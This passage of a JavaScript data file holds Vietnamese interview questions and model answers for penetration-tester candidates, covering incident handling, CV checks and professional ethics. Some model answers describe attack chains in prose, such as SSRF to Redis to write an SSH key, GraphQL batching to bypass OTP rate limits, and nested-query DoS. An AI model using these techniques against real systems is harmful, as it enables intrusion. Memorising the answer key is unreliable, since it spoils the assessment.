    ["Làm thế nào để leo thang từ việc đọc file cục bộ (Local File Read) sang tấn công SSRF quét mạng nội bộ của máy chủ backend?", "Các biện pháp cấu hình an toàn cho thư viện chuyển đổi PDF (bật cờ `--disable-local-file-access`)?"] ,
    ["wkhtmltopdf Exploitation", "Local File Read", "Server-side PDF Generation", "Headless Browser Abuse"],
    [OFF_SRC.portswigger, OFF_SRC.internal],
    ["Chỉ thử chèn chữ bình thường mà không kiểm tra khả năng can thiệp vào giao thức `file://` của công cụ tạo PDF"]
  ),
  q("PENTEST-SCEN-06", "Penetration Tester (PenTest)", "scenario", "advanced", "middle",
    "Tình huống: Trong lúc thực hiện pentest theo thỏa thuận với khách hàng, một đoạn mã payload khai thác của em vô tình làm tê liệt dịch vụ cơ sở dữ liệu trên môi trường Staging (Service Crash). Em xử lý sự cố khẩn cấp này như thế nào (thông báo cho ai, ghi nhận log, và phối hợp khôi phục ra sao)?",
    ["Dừng ngay lập tức toàn bộ các hoạt động thử nghiệm trên phân vùng hệ thống đó", "Ghi nhận chính xác mốc thời gian, địa chỉ IP nguồn, và đúng chuỗi payload cụ thể vừa gửi đã kích hoạt sự cố crash", "Liên hệ ngay lập tức với đầu mối liên lạc khẩn cấp (Emergency Point of Contact) của khách hàng được quy định trong RoE; báo cáo trung thực sự việc và cung cấp thông tin kỹ thuật hỗ trợ đội ngũ vận hành khôi phục dịch vụ"],
    ["Làm thế nào để rút ra bài học và tinh chỉnh các công cụ kiểm thử nhằm tránh việc gửi các payload có nguy cơ gây Denial of Service trong tương lai?", "Quy trình nghiệm thu và kiểm tra an toàn trước khi được phép tiếp tục cuộc kiểm thử?"] ,
    ["Incident during Pentest", "Emergency RoE Protocol", "Service Crash Handling", "Professional Responsibility"],
    [OFF_SRC.nist_pentest, OFF_SRC.internal],
    ["Hoảng loạn im lặng giấu giếm sự việc và hy vọng khách hàng không biết là do mình làm sập"]
  ),

  // CV Validation (5)
  q("PENTEST-CV-01", "Penetration Tester (PenTest)", "cv_validation", "advanced", "senior_lead",
    "Trong dự án kiểm thử xâm nhập ứng dụng web/API quy mô lớn mà em ghi trên CV: Hãy chia sẻ về chuỗi khai thác (Exploit Chain) phức tạp và ấn tượng nhất mà em đã tự tay xây dựng để leo thang từ một lỗ hổng mức độ Thấp lên Chiếm quyền điều khiển máy chủ (RCE) hoặc Rò rỉ dữ liệu toàn hệ thống?",
    ["Trình bày mạch lạc chuỗi xâu chuỗi: Bắt đầu từ rò rỉ thông tin nhẹ (Info Disclosure) lấy được tên miền nội bộ -> Khai thác SSRF vượt qua tường lửa vào mạng riêng -> Tìm thấy dịch vụ Redis không đặt mật khẩu ở mạng trong -> Ghi SSH key vào thư mục root của máy chủ để chiếm RCE", "Chứng minh tư duy sáng tạo của một Pentester thực chiến thay vì chỉ dựa dẫm vào công cụ quét tự động", "Dẫn chứng phản hồi đánh giá cao của khách hàng và việc lỗ hổng đã được khắc phục triệt để"],
    ["Khó khăn lớn nhất khi vượt qua các hàng rào phòng thủ nhiều lớp trong chuỗi khai thác đó là gì?", "Em đã đề xuất giải pháp vá lỗi toàn diện ở tầng kiến trúc ra sao thay vì chỉ vá từng lỗ hổng đơn lẻ?"] ,
    ["CV Validation", "Exploit Chaining", "Low to Critical Escalation", "Real-world Pentesting", "SSRF to RCE"],
    [OFF_SRC.internal],
    ["Chỉ kể về việc tìm thấy các lỗi đơn lẻ cơ bản như XSS hay CSRF mà không có chuỗi khai thác sâu"]
  ),
  q("PENTEST-CV-02", "Penetration Tester (PenTest)", "cv_validation", "intermediate", "middle",
    "CV của em có nhắc đến việc kiểm thử bảo mật ứng dụng di động (Mobile App Pentest iOS và Android). Em đã từng phát hiện lỗ hổng nghiêm trọng nào nằm sâu trong mã nguồn gốc (Insecure Deep Links, Lộ khóa mật mã trong tệp nhị phân, hay Lỗ hổng IPC/Exported Activities) và phương pháp khai thác thực tế của em là gì?",
    ["Mô tả lỗ hổng cụ thể: Insecure Deep Links cho phép ứng dụng bên ngoài kích hoạt chuyển khoản mà không cần xác thực lại mật khẩu", "Sử dụng adb commands hoặc xây dựng ứng dụng mã độc thử nghiệm (PoC Android App) để gửi Intent khai thác Exported Component", "Phát hiện khóa Private Key mã hóa cơ sở dữ liệu Realm/SQLite lưu trữ dưới dạng chuỗi string viết cứng trong thư viện Shared Object (.so)"],
    ["Làm thế nào để phân tích dữ liệu lưu trữ không an toàn trong bộ nhớ máy (Insecure Local Storage: SharedPreferences, Keychain)?", "Quy trình kiểm tra tính toàn vẹn của ứng dụng chống việc bị can thiệp chèn mã độc và ký lại (Anti-tampering)?"] ,
    ["Mobile Pentest", "Deep Link Exploitation", "Exported Activities", "Hardcoded Keys", "Frida Hooking"],
    ["https://mas.owasp.org/", OFF_SRC.internal],
    ["Chỉ kiểm tra các gói tin HTTP gửi đi của app mà bỏ qua hoàn toàn việc kiểm thử các thành phần bảo mật cục bộ của hệ điều hành di động"]
  ),
  q("PENTEST-CV-03", "Penetration Tester (PenTest)", "cv_validation", "advanced", "middle",
    "Em ghi trên CV các chứng chỉ chuyên nghiệp thực hành thực chiến (như OSCP, OSWE, CRTP, Burp Suite Certified Practitioner). Hãy chia sẻ về bài thi thử thách nhất mà em đã vượt qua: cách em quản lý thời gian, tư duy bế tắc (Try Harder mindset) và bài học kỹ thuật lớn nhất rút ra từ kỳ thi đó?",
    ["Chia sẻ trải nghiệm thực tế trong kỳ thi 24/48 giờ áp lực cao: lập kế hoạch phân bổ thời gian rõ ràng, ghi chép tài liệu và ảnh chụp từng bước (Documentation) ngay khi khai thác", "Tư duy vượt qua bế tắc (Rabbit Hole): biết khi nào nên dừng lại một hướng tiếp cận không khả thi sau 2 giờ để quay lại rà soát các dịch vụ khác", "Nắm vững phương pháp luận kiểm thử có hệ thống hơn là việc thử các payload may rủi"],
    ["Kỹ năng thực chiến từ kỳ thi đó đã giúp ích trực tiếp cho các dự án pentest khách hàng thực tế sau này như thế nào?", "Em đánh giá sự khác biệt giữa môi trường thi phòng thí nghiệm (CTF/Labs) và môi trường sản xuất thực tế của khách hàng?"] ,
    ["OSCP", "OSWE", "Practical Certification", "Try Harder Mindset", "Time Management"],
    [OFF_SRC.internal],
    ["Khai báo chứng chỉ nhưng không nhớ được cấu trúc bài thi hoặc thừa nhận học thuộc lòng bài giải có sẵn trên mạng"]
  ),
  q("PENTEST-CV-04", "Penetration Tester (PenTest)", "cv_validation", "intermediate", "middle",
    "Trong một dự án kiểm thử bảo mật API (RESTful / GraphQL) mà em từng thực hiện trên CV: Những điểm yếu đặc thù của GraphQL (Introspection Query mở, Batching Attacks, Nested Query DoS) hay API Gateway mà em đã trực tiếp khai thác thành công là gì?",
    ["Khai thác GraphQL Introspection Query để tải về toàn bộ lược đồ schema ẩn chứa các câu truy vấn và đột biến (Mutations) quản trị nhạy cảm", "Tấn công Nested Query DoS: gửi câu truy vấn lồng nhau hàng chục tầng (Author -> Posts -> Author -> Posts...) làm cạn kiệt tài nguyên CPU/RAM máy chủ", "Tấn công GraphQL Batching: nhồi nhét hàng nghìn câu lệnh xác thực OTP vào một request HTTP duy nhất để vượt qua giới hạn Rate Limiting của API Gateway"],
    ["Làm thế nào để hướng dẫn lập trình viên giới hạn độ sâu của câu truy vấn (Query Depth Limiting) và tính toán độ phức tạp (Query Cost Analysis) trong GraphQL?", "Cách kiểm thử phân quyền các trường dữ liệu riêng lẻ (Field-level Authorization)?"] ,
    ["GraphQL Pentest", "Introspection Query", "Nested Query DoS", "Batching Attack", "API Security"],
    [OFF_SRC.owasp, OFF_SRC.internal],
    ["Đối xử với GraphQL giống hệt như REST API thông thường và bỏ qua các vector tấn công đặc thù của kiến trúc Graph"]
  ),
  q("PENTEST-CV-05", "Penetration Tester (PenTest)", "cv_validation", "advanced", "senior_lead",
    "CV của em có nhắc đến việc tham gia các chương trình Săn lỗi nhận thưởng (Bug Bounty) hoặc phát hiện lỗ hổng có mã định danh CVE/Hall of Fame. Hãy trình bày một lỗ hổng bảo mật độc đáo mà em tự hào nhất, quy trình báo cáo có trách nhiệm (Responsible Disclosure) và phản hồi từ phía tổ chức quản lý?",
    ["Trình bày chi tiết lỗ hổng logic nghiệp vụ độc đáo mà các công cụ quét tự động hoàn toàn bỏ sót", "Quy trình báo cáo bảo mật có trách nhiệm: liên hệ đúng kênh Security.txt hoặc nền tảng HackerOne/Bugcrowd, cung cấp hướng dẫn PoC rõ ràng và tôn trọng thời hạn khắc phục 90 ngày trước khi công bố", "Thái độ chuyên nghiệp, bảo mật thông tin và tôn trọng quy định bảo mật của chương trình"],
    ["Bài học rút ra về sự khác biệt giữa tư duy kiểm thử có khung giờ cố định và tư duy săn lỗi tự do trong Bug Bounty?", "Làm thế nào để duy trì đạo đức nghề nghiệp và không bị cám dỗ bán lỗ hổng ra thị trường chợ đen?"] ,
    ["Bug Bounty", "Responsible Disclosure", "Business Logic Flaw", "Security Ethics", "CVE Discovery"],
    [OFF_SRC.internal],
    ["Khoe khoang việc khai thác phá hoại hoặc tống tiền doanh nghiệp sau khi tìm thấy lỗ hổng"]
  ),

  // Behavioral (5)
  q("PENTEST-BEHAV-01", "Penetration Tester (PenTest)", "behavioral", "intermediate", "middle",
    "Khi đội ngũ lập trình viên phản ứng gay gắt trước báo cáo lỗ hổng của em và cho rằng: 'Đây chỉ là lỗi lý thuyết trong phòng lab, ngoài đời người dùng bình thường không bao giờ làm như vậy nên chúng tôi không rảnh để sửa', em giải thích và thuyết phục họ ra sao?",
    ["Giữ thái độ điềm tĩnh, chuyên nghiệp; không tranh cãi bằng cái tôi cá nhân", "Giải thích rõ ràng: Tin tặc không phải là 'người dùng bình thường'; chúng sử dụng các công cụ tự động để dò tìm chính xác những kịch bản phi chuẩn mực này", "Thực hiện một buổi diễn tập trực tiếp (Live Demo PoC): trình diễn một kịch bản tấn công thực tế và chỉ ra hậu quả cụ thể đến dữ liệu khách hàng; sau đó nhiệt tình hướng dẫn họ các phương án sửa code đơn giản, ít tốn công nhất"],
    ["Làm thế nào để xây dựng mối quan hệ đối tác tin cậy với đội ngũ Dev thay vì bị xem là 'kẻ chuyên bới lông tìm vết'?", "Khi một tranh chấp về mức độ rủi ro (Severity Rating) không thể giải quyết, em điều phối thống nhất theo khung CVSS khách quan ra sao?"] ,
    ["Overcoming Developer Skepticism", "Live PoC Demonstration", "Empathy with Devs", "CVSS Objectivity"],
    [OFF_SRC.internal],
    ["Cười nhạo trình độ của lập trình viên hoặc dọa dẫm báo cáo lên ban giám đốc để ép họ phải sửa"]
  ),
  q("PENTEST-BEHAV-02", "Penetration Tester (PenTest)", "behavioral", "advanced", "senior_lead",
    "Trong quá trình kiểm thử một ứng dụng web, em tình cờ phát hiện ra một lỗ hổng cực kỳ nghiêm trọng trên một máy chủ của một đơn vị bên thứ ba (Third-party vendor) hoàn toàn nằm ngoài phạm vi thỏa thuận kiểm thử (Out of Scope). Em xử lý tình huống đạo đức và pháp lý nhạy cảm này như thế nào?",
    ["Dừng ngay lập tức mọi hoạt động khai thác sâu hơn vào máy chủ ngoài phạm vi đó để tuân thủ tuyệt đối quy định pháp luật", "Ghi nhận hiện tượng một cách cẩn trọng và thông báo ngay lập tức cho Khách hàng chủ quản: giải thích mối đe dọa liên đới tiềm tàng từ đối tác thứ ba đó đến an ninh chung của khách hàng", "Hướng dẫn khách hàng kích hoạt kênh liên hệ bảo mật chính thức với đối tác thứ ba để phối hợp xử lý theo quy trình công bố có trách nhiệm"],
    ["Tại sao việc tự ý tấn công một hệ thống nằm ngoài phạm vi RoE - dù với mục đích tốt - vẫn cấu thành hành vi vi phạm pháp luật hình sự?", "Cách ghi nhận phát hiện ngoài phạm vi (Out-of-Scope finding) vào phụ lục báo cáo một cách an toàn về mặt pháp lý?"] ,
    ["Out of Scope Discovery", "Legal Boundaries", "Third-party Risk", "Ethical Responsibility"],
    [OFF_SRC.nist_pentest, OFF_SRC.internal],
    ["Tiếp tục tấn công khai thác máy chủ bên thứ ba với lý do 'tiện thể kiểm tra giúp họ'"]
  ),
  q("PENTEST-BEHAV-03", "Penetration Tester (PenTest)", "behavioral", "intermediate", "junior",
    "Sau 4 ngày kiểm thử một ứng dụng được lập trình rất cẩn thận, em hoàn toàn không tìm thấy bất kỳ lỗ hổng mức độ Cao hay Nghiêm trọng nào. Áp lực vô hình khiến em cảm thấy như mình 'chưa hoàn thành nhiệm vụ' hoặc sợ khách hàng đánh giá năng lực kém. Em quản lý tâm lý bản thân và lập báo cáo ra sao?",
    ["Thẳng thắn nhìn nhận: Mục tiêu của Pentest là đánh giá trung thực hiện trạng an ninh của hệ thống, không phải là 'cố tình bới móc' để làm đẹp số lượng lỗi", "Không cố tình phóng đại các lỗi nhỏ nhặt hoặc cấu hình lỏng lẻo thông thường thành lỗi nghiêm trọng để đối phó", "Tập trung phân tích sâu vào các biện pháp phòng thủ tốt mà khách hàng đã triển khai (Positive Findings), đồng thời chỉ ra các điểm có thể củng cố thêm (Hardening Recommendations) để nâng cao độ bền vững"],
    ["Làm thế nào để chứng minh cho khách hàng thấy giá trị của một cuộc kiểm thử ngay cả khi không có lỗ hổng nghiêm trọng nào được phát hiện?", "Cách rà soát lại phương pháp luận của bản thân để đảm bảo mình không bị bỏ sót góc khuất nào trước khi kết luận?"] ,
    ["Integrity in Reporting", "Zero Finding Dilemma", "Positive Observations", "Professional Honesty"],
    [OFF_SRC.internal],
    ["Thổi phồng các cảnh báo vô hại thành lỗ hổng Critical để làm báo cáo trông có vẻ hoành tráng"]
  ),
  q("PENTEST-BEHAV-04", "Penetration Tester (PenTest)", "behavioral", "advanced", "middle",
    "Khách hàng yêu cầu em thực hiện kiểm thử xâm nhập trực tiếp trên môi trường Production đang phục vụ hàng triệu người dùng thật trong giờ cao điểm vì họ không có môi trường Staging tương đương. Em phân tích rủi ro và thương lượng các biện pháp an toàn ra sao?",
    ["Cảnh báo rõ ràng cho khách hàng về rủi ro gián đoạn dịch vụ, hỏng cơ sở dữ liệu và ảnh hưởng đến giao dịch của người dùng thật", "Đàm phán chuyển khung giờ kiểm thử sang giờ thấp điểm ban đêm (Maintenance Window: 1h - 4h sáng) có sự túc trực sẵn sàng của đội ngũ kỹ sư vận hành hệ thống", "Loại bỏ hoàn toàn các bài kiểm tra có nguy cơ gây mất ổn định (như DoS, brute-force tải lớn, lệnh ghi/xóa dữ liệu hàng loạt) và chỉ thực hiện các payload kiểm tra logic an toàn"],
    ["Những điều khoản bắt buộc phải bổ sung vào Hợp đồng / RoE khi kiểm thử trên môi trường Production là gì?", "Quy trình kích hoạt nút dừng khẩn cấp (Emergency Abort Button) khi hệ thống có dấu hiệu quá tải?"] ,
    ["Production Pentest Risks", "Maintenance Window", "Safe Testing Scope", "Contractual Safeguards"],
    [OFF_SRC.nist_pentest, OFF_SRC.internal],
    ["Vô tư chạy các công cụ quét tự động với tốc độ tối đa trên Production vào giờ cao điểm của khách hàng"]
  ),
  q("PENTEST-BEHAV-05", "Penetration Tester (PenTest)", "behavioral", "intermediate", "senior_lead",
    "Một người bạn thân ngoài công việc ngỏ ý nhờ em 'thử hack vào tài khoản mạng xã hội của người yêu họ' hoặc 'kiểm tra giùm website của công ty đối thủ xem có lỗ hổng không'. Em từ chối và giải thích về ranh giới đạo đức nghề nghiệp của một Chuyên gia An ninh mạng ra sao?",
    ["Kiên quyết từ chối ngay lập tức, không có bất kỳ ngoại lệ nào; giữ vững lập trường đạo đức và pháp luật", "Giải thích rõ ràng và nghiêm túc: Mọi hành vi tấn công mạng không có sự ủy quyền chính thức bằng văn bản đều là hành vi phạm tội hình sự và vi phạm nghiêm trọng lời thề đạo đức nghề nghiệp", "Tư vấn cho bạn các giải pháp lành mạnh, hợp pháp để giải quyết vấn đề cá nhân hoặc hướng dẫn công ty đối thủ tự thuê dịch vụ bảo mật chính thống"],
    ["Làm thế nào để một Chuyên gia An ninh mạng luôn giữ được 'Tâm sáng' khi nắm trong tay những công cụ và kỹ năng có sức công phá nguy hiểm?", "Trách nhiệm của một Senior Pentester trong việc định hướng đạo đức cho các bạn trẻ mới vào ngành?"] ,
    ["Professional Ethics", "Legal Integrity", "Firm Refusal", "White-hat Principles"],
    [OFF_SRC.internal],
    ["Nhận lời tấn công trái phép cho bạn bè, xem nhẹ trách nhiệm pháp lý và ranh giới đạo đức của ngành an ninh thông tin"]
  )
];

// 9. RED TEAM ENGINEER


console.log("Penetration Tester questions defined:", pentestQuestions.length);

module.exports = {
  pentestQuestions,
};
